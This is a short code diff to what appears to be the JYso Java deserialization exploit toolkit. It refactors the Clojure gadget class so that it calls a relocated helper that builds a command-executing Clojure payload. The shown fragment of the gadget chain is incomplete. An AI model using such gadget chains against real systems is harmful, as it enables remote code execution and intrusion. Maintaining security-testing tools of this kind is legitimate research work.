@@ -7,7 +7,7 @@ import clojure.lang.PersistentArrayMap;
 import clojure.main$eval_opt;
 import com.qi4l.JYso.gadgets.annotation.Authors;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
-import com.qi4l.JYso.gadgets.utils.clojure.ClojureUtil;
+
 
 import java.util.HashMap;
 import java.util.Map;
@@ -34,7 +34,7 @@ import static com.qi4l.JYso.gadgets.annotation.Authors.JACKOFMOSTTRADES;
 public class Clojure implements ObjectPayload<Map<?, ?>> {
 
     public Map<?, ?> getObject(String command) throws Exception {
-        String clojurePayload = ClojureUtil.makeClojurePayload(command);
+        String clojurePayload = com.qi4l.JYso.gadgets.utils.Utils.makeClojurePayload(command);
         Map<String, Object> fnMap = new HashMap<>();
         fnMap.put("hashCode", (new core$constantly()).invoke(0));
         AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();
